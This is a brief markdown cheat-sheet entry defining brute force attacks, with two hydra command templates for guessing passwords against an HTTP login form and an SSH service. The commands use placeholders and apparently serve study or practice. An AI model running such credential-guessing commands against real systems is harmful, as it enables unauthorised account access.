# Brute force attacks

**Brute force attacks** are attacks where a vast amount of options are tested in
order to find credentials or similar.

## Examples with hydra

Here are some examples of password brute force attacks using the `hydra` tool.

### HTTP form data

```sh
hydra -l <username> -P <list-list> <ip> http-post-form "/rest/user/login:email=^USER^&password=^PASSWORD^:F=Invalid"
```

### SSH

```sh
hydra -l <username> -P <password-list> ssh://<ip>
```
